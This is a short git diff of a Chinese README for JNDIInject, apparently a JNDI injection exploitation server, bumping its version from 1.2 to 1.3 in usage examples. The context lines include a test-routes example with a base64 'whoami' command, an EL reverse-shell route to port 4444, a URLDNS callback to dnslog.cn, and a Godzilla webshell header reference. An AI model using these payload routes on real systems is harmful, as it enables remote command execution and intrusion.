@@ -14,7 +14,7 @@
 ## **使用说明**
 - - - -
 ```shell
-Usage: java -jar JNDIInject-1.2-SNAPSHOT.jar [options]
+Usage: java -jar JNDIInject-1.3-SNAPSHOT.jar [options]
   Options:
     -i, --ip       Local ip address  (default: 0.0.0.0)
     -l, --ldapPort Ldap bind port (default: 1389)
@@ -364,13 +364,13 @@ x-client-data:godzilla
 在启动服务前验证路径解析是否正确：
 
 ```shell
-java -jar JNDIInject-1.2-SNAPSHOT.jar -d
+java -jar JNDIInject-1.3-SNAPSHOT.jar -d
 ```
 
 使用自定义测试路由：
 
 ```shell
-java -jar JNDIInject-1.2-SNAPSHOT.jar -d --test-routes "basic/base64/d2hvYW1p,EL/reverseshell/127.0.0.1/4444,URLDNS/dnslog.cn"
+java -jar JNDIInject-1.3-SNAPSHOT.jar -d --test-routes "basic/base64/d2hvYW1p,EL/reverseshell/127.0.0.1/4444,URLDNS/dnslog.cn"
 ```
 
 ## 动作分类
